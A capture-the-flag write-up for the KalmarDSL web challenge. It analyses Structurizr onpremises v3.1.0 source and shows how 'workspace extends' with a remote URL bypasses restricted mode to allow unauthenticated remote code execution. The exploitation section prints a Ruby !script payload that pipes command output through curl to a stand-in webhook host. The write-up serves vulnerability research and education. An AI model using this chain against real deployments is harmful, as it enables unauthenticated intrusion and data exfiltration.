---
title: KalmarCTF - KalmarDSL - web - 14 solves
published: true
---

# KalmarDSL - web

- Challenge description:

> A !flag in my diagram? Hopefully someone has already patched the C4.
>
> Note: The setup has no Structurizr users and default creds are not supposed to work. Bruteforce is not allowed (and will not work). Goal is Unauthenticated RCE, 0day go brrr?

- Number of solves: `14`
- Points: `366`

---

## The Challenge

The intended solution as mentioned in the description is Unauthenticated RCE in the deployed _structurizr/onpremises v3.1.0_ service. This service allows to create diagrams based on code. In order to specifically get the flag we need to get the output of:

```bash
/would you be so kind to provide me with a flag
```

command (multiple arguments) on the server running the service sent to us.

Dockerfile used to deploy the challenge:

```dockerfile
# Build read flag binary
FROM gcc:latest AS gccbuilder
WORKDIR /
COPY would.c /
RUN gcc -o would would.c

# Build challenge WAR file
FROM gradle:jdk17-noble AS gradlebuilder
WORKDIR /
RUN git clone https://github.com/structurizr/ui.git structurizr-ui
RUN git clone https://github.com/structurizr/onpremises.git structurizr-onpremises
WORKDIR /structurizr-onpremises
# Target: structurizr/onpremises v3.1.0
RUN git reset --hard c11ff7c3986529839ba4cf9c6fd9efa3b9045f1c
RUN echo 'structurizrVersion=3.1.0' > gradle.properties
# Fix 'bug' in structurizr/onpremises: the !script tag didn't work.
RUN sed -i '/^dependencies/a \    implementation "org.jruby:jruby-core:9.4.12.0"' structurizr-onpremises/build.gradle
RUN bash ./ui.sh
RUN ./gradlew clean build -x integrationTest

# Challenge Dockerfile
FROM tomcat:10.1.35-jre21-temurin-noble
ENV PORT=8080

# Switch to root user so we can add a getflag SUID binary
USER root
WORKDIR /
COPY --from=gccbuilder /would /would
COPY flag.txt /
RUN chmod 400 /flag.txt && chmod 6111 /would

# ... you're welcome!
RUN set -eux; \
	apt-get update; \
	apt-get install -y --no-install-recommends ncat

# Hardening against unintended boring read-any-file bugs
RUN groupadd -r tomcatgroup && useradd -r -m -g tomcatgroup tomcatuser
RUN chown -R tomcatuser:tomcatgroup /usr/local/tomcat
USER tomcatuser

COPY --from=gradlebuilder /structurizr-onpremises/structurizr-onpremises/build/libs/structurizr-onpremises.war /usr/local/tomcat/webapps/ROOT.war

EXPOSE 8080

CMD ["catalina.sh", "run"]
```

Seems like a standard deployment configuration with one exception:

```dockerfile
# Fix 'bug' in structurizr/onpremises: the !script tag didn't work.
RUN sed -i '/^dependencies/a \    implementation "org.jruby:jruby-core:9.4.12.0"' structurizr-onpremises/build.gradle
```

which just updates one of the dependencies, but highlights an important feature on which I focused during the competition: **the !script tag**. Additionally it's worth mentioning that the default credentials were intended not to work and they didn't.

So we need to find unauthenticated entrypoints. I have cloned the [onpremises repository](https://github.com/structurizr/onpremises) to see the exact logic that's handling any requests.

After a **long** time of research of all paths, I found [`POST /dsl`](https://github.com/structurizr/onpremises/blob/c9f852416ec3f924301dcd028b68088221693baa/structurizr-onpremises/src/main/java/com/structurizr/onpremises/web/dsl/PublicDslController.java#L56) endpoint which is not protected and as the name of the file suggests, is supposed to be public:

```java
@RequestMapping(value = "/dsl", method = RequestMethod.POST)
public String postDsl(ModelMap model,
                    @RequestParam(required = true) String source,
                    @RequestParam(required = false) String json,
                    @RequestParam(required = false, defaultValue = "") String view) throws Exception {

    if (!Configuration.getInstance().isFeatureEnabled(com.structurizr.onpremises.configuration.Features.UI_DSL_EDITOR)) {
        return showError("public-dsl-editor-disabled", model);
    }

    model.addAttribute("method", "post");

    return show(model, source, json, view);
}
```

During the competition I have deeply investigated all of the available parameters, however the only one that was truly useful is `source`. It should contain a proper DSL code, if an invalid one was provided the server returned an error telling where and what was the error. You can see how does the DSL language looks like in [structurizr playground](https://structurizr.com/dsl). It's mostly a declarative language for modelling an architecture as code:

> The Structurizr DSL provides a way to define a software architecture model (based upon the C4 model) using a text-based domain specific language (DSL). The Structurizr DSL has appeared on the ThoughtWorks Tech Radar - Techniques - Diagrams as code and is text-based wrapper around Structurizr for Java.
>
> *https://docs.structurizr.com/dsl#structurizr-dsl*

Example DSL code that models a `User` that `uses` a `Software system`:

```dsl
workspace {
    model {
        u = person "User"
        ss = softwareSystem "Software System"

        u -> ss "Uses"
    }

    views {
        systemContext ss {
            include *
            autolayout lr
        }
    }
}
```

Remember the `!script` tag mentioned in the Dockerfile? Well, as the [documentation states](https://docs.structurizr.com/dsl/cookbook/scripts/):

> The !script keyword provides a way to run scripts written in Groovy, Kotlin, Ruby, and JavaScript.

which sounds like a RCE! Nice. Let's try it as they mention in their example:

```dsl
!script javascript {
    console.log(1)
}
```

Hm, something went wrong. Let's see the code further what's going on in the [`show`](https://github.com/structurizr/onpremises/blob/c9f852416ec3f924301dcd028b68088221693baa/structurizr-onpremises/src/main/java/com/structurizr/onpremises/web/dsl/PublicDslController.java#L70) method:

```java
public String show(ModelMap model, String source, String json, String view) throws Exception {
    WorkspaceMetaData workspaceMetaData = new WorkspaceMetaData(0);
    workspaceMetaData.setName("Workspace");
    workspaceMetaData.setEditable(true);
    workspaceMetaData.setLastModifiedDate(new Date());

    if (StringUtils.isNullOrEmpty(source)) {
        source = DslTemplate.generate("Name", "Description");
    }

    view = HtmlUtils.filterHtml(view);

    Workspace workspace = null;

    try {
        workspace = fromDsl(source);
    } catch (StructurizrDslParserException e) {
        model.addAttribute("line", e.getLineNumber());
        model.addAttribute("errorMessage", e.getMessage());
    } catch (WorkspaceScopeValidationException e) {
        model.addAttribute("errorMessage", e.getMessage());
    }

    model.addAttribute("dslVersion", Class.forName(StructurizrDslParser.class.getCanonicalName()).getPackage().getImplementationVersion());
    model.addAttribute("source", source);
    model.addAttribute("view", view);
    model.addAttribute("workspace", workspaceMetaData);

    if (workspace != null) {
        workspace.setLastModifiedDate(new Date());

        if (!StringUtils.isNullOrEmpty(json)) {
            Workspace oldWorkspace = WorkspaceUtils.fromJson(json);

            try {
                workspace.getViews().copyLayoutInformationFrom(oldWorkspace.getViews());
            } catch (Exception e) {
                // ignore
            }
        }

        model.addAttribute("workspaceAsJson", JsonUtils.base64(WorkspaceUtils.toJson(workspace, false)));
    } else {
        if (!StringUtils.isNullOrEmpty(json)) {
            Workspace oldWorkspace = WorkspaceUtils.fromJson(json);
            model.addAttribute("workspaceAsJson", JsonUtils.base64(WorkspaceUtils.toJson(oldWorkspace, false)));
        } else {
            model.addAttribute("workspaceAsJson", JsonUtils.base64(WorkspaceUtils.toJson(new Workspace("Workspace", ""), false)));
        }
    }

    addCommonAttributes(model, "DSL", false);

    return "dsl-public";
}
```

it seems that our payload is going into the `fromDsl` function and errors if it fails - we don't really control in a useful way anything else:

```java
try {
    workspace = fromDsl(source);
} catch (StructurizrDslParserException e) {
    model.addAttribute("line", e.getLineNumber());
    model.addAttribute("errorMessage", e.getMessage());
} catch (WorkspaceScopeValidationException e) {
    model.addAttribute("errorMessage", e.getMessage());
}
```

Let's see what's inside the [`fromDsl`](https://github.com/structurizr/onpremises/blob/c9f852416ec3f924301dcd028b68088221693baa/structurizr-onpremises/src/main/java/com/structurizr/onpremises/web/dsl/PublicDslController.java#L126) function:

```java
private Workspace fromDsl(String dsl) throws StructurizrDslParserException, WorkspaceScopeValidationException {
    StructurizrDslParser parser = new StructurizrDslParser();
    parser.getFeatures().configure(Features.ARCHETYPES, Configuration.PREVIEW_FEATURES);
    parser.setRestricted(true);
    parser.parse(dsl);

    Workspace workspace = parser.getWorkspace();
    DslUtils.setDsl(workspace, dsl);

    // add default views if no views are explicitly defined
    if (!workspace.getModel().isEmpty() && workspace.getViews().isEmpty()) {
        workspace.getViews().createDefaultViews();
    }

    WorkspaceValidationUtils.validateWorkspaceScope(workspace);

    return workspace;
}
```

Ah, I see:

```java
parser.setRestricted(true);
```

prevents from executing the `!script` directive. Let's dive deeper how does the `StructurizrDslParser` truly parses our payload. From the [import statement](https://github.com/structurizr/onpremises/blob/c9f852416ec3f924301dcd028b68088221693baa/structurizr-onpremises/src/main/java/com/structurizr/onpremises/web/dsl/PublicDslController.java#L6) I see that we need to see the parser in a different repository, that is required by **structurizr-onpremises**: https://github.com/structurizr/java/tree/v3.1.0. After searching for `StructurizrDslParser` we can see that it [sets the `restriced` flag by default to false](https://github.com/structurizr/java/blob/db96f9ad6181e63b2294072e382119c2feb8909a/structurizr-dsl/src/main/java/com/structurizr/dsl/StructurizrDslParser.java#L65) - only after explicit `setRestricted(true)` it becomes `true`.

Inside the [`parse` function](https://github.com/structurizr/java/blob/db96f9ad6181e63b2294072e382119c2feb8909a/structurizr-dsl/src/main/java/com/structurizr/dsl/StructurizrDslParser.java#L204) that takes our payload and processes it, we can find the [code block](https://github.com/structurizr/java/blob/db96f9ad6181e63b2294072e382119c2feb8909a/structurizr-dsl/src/main/java/com/structurizr/dsl/StructurizrDslParser.java#L297) that occurs when the `!script` tag is found:

```java
} else if (SCRIPT_TOKEN.equalsIgnoreCase(firstToken)) {
    if (!restricted) {
        ScriptParser scriptParser = new ScriptParser();
        if (scriptParser.isInlineScript(tokens)) {
            String language = scriptParser.parseInline(tokens.withoutContextStartToken());
            startContext(new InlineScriptDslContext(getContext(), dslFile, this, language));
        } else {
            String filename = scriptParser.parseExternal(tokens.withoutContextStartToken());
            startContext(new ExternalScriptDslContext(getContext(), dslFile, this, filename));

            if (shouldStartContext(tokens)) {
                // we'll wait for parameters before executing the script
            } else {
                endContext();
            }
        }
    } else {
        throwRestrictedModeException(firstToken);
    }
}
```

So that's where the `restricted` check failed our initial `console.log` payload:

```java
if (!restricted) {
    ...
} else {
    throwRestrictedModeException(firstToken);
}
```

We can't execute anything until the `restricted` flag is set to true. There's also an `!include` directive allowing for external source DSL code, but it executes in the same context as the caller DSL, so the `restricted` flag remains.

After some time, I found that when we send `workspace` keyword it [creates a new `WorkspaceParser`](https://github.com/structurizr/java/blob/0351c2dce30dd1d98d2ef4dc438db747bf646dea/structurizr-dsl/src/main/java/com/structurizr/dsl/StructurizrDslParser.java#L610):

```java
} else if (WORKSPACE_TOKEN.equalsIgnoreCase(firstToken) && contextStack.empty()) {
    if (parsedTokens.contains(WORKSPACE_TOKEN)) {
        throw new RuntimeException("Multiple workspaces are not permitted in a DSL definition");
    }
    DslParserContext dslParserContext = new DslParserContext(dslFile, restricted);
    dslParserContext.setIdentifierRegister(identifiersRegister);

    workspace = new WorkspaceParser().parse(dslParserContext, tokens.withoutContextStartToken());
    extendingWorkspace = !workspace.getModel().isEmpty();
    startContext(new WorkspaceDslContext());
    parsedTokens.add(WORKSPACE_TOKEN);
}
```

When we look at the [`WorkspaceParser` file](https://github.com/structurizr/java/blob/0351c2dce30dd1d98d2ef4dc438db747bf646dea/structurizr-dsl/src/main/java/com/structurizr/dsl/WorkspaceParser.java#L14) we can see that there's an option to `extend` the workspace with a url:

```java
private static final String GRAMMAR_EXTENDS = "workspace extends <file|url>";
```

Let's see what exaclty happens after we use a url instead of a file _(I have added comments on top of the code)_:

```java
try {
    if (source.startsWith("https://") || source.startsWith("http://")) { // executes regardless of `restricted` keyword
        RemoteContent content = readFromUrl(source);

        if (source.endsWith(".json") || content.getContentType().startsWith(RemoteContent.CONTENT_TYPE_JSON)) {
            String json = content.getContent();
            workspace = WorkspaceUtils.fromJson(json);
            registerIdentifiers(workspace, context);
        } else {
            String dsl = content.getContent(); // Gets the DSL code from our website
            StructurizrDslParser structurizrDslParser = new StructurizrDslParser(); // creates a new StructurizrDslParser instance
            structurizrDslParser.parse(context, dsl); // actually parses our DSL code from our website without passing the `restricted` flag!
            workspace = structurizrDslParser.getWorkspace();
        }
    } else {
        if (context.isRestricted()) { // executes only if we provide anything besides a link
            throw new RuntimeException("Cannot import workspace from a file when running in restricted mode");
        }
    ...
    }
```

Focusing on the following fragment:

```java
String dsl = content.getContent(); // Gets the DSL code from our website
StructurizrDslParser structurizrDslParser = new StructurizrDslParser(); // creates a new StructurizrDslParser instance
structurizrDslParser.parse(context, dsl); // actually parses our DSL code from our website without passing the `restricted` flag!
```

we can see that now the `!script` tag is now available. So now as we know how to get to the `!script` tag let's go with the exploitation plan.

---

## Exploitation

1. Preparing a payload that extends the workspace with our malicious website:

```dsl
workspace extends "https://our-website.com" {
    model {
        u = person "User"
        ss = softwareSystem "Software System"
        u -> ss "Uses"
    }

    views {
        systemContext ss "Diagram1" {
            include *
            autolayout lr
        }
    }
}
```

2. Set the response body of `https://our-website.com` to contain a DSL code block containing `ruby` language _(it's the only language working as it was fixed in dockerfile)_ with `system` function executing system command:

```bash
/would you be so kind to provide me with a flag | curl -X POST -d @- https://our-webhook.site/
```

that would send using curl the output of the `/would you be so kind to provide me with a flag` execution to `https://our-webhook.site/`.

In DSL it would look like this:

```dsl
!script ruby {
    system("/would you be so kind to provide me with a flag | curl -X POST -d @- https://our-webhook.site/")
}
```

3. Send the payload from `1.` step as `source` to `POST /dsl` endpoint.

4. The flag should appear on `https://our-webhook.site/`!

---

Overall it was very satisfying to find this vulnerability in an open source project, however I'm wondering whether such challenges are solvable within a short time limit on CTF contests - such projects as this one are usually very complex and have multiple completely irrelevant to the challenge entrypoints to be investigated, which is not the actual challenge difficulty, but the size of the attack surface to cover.
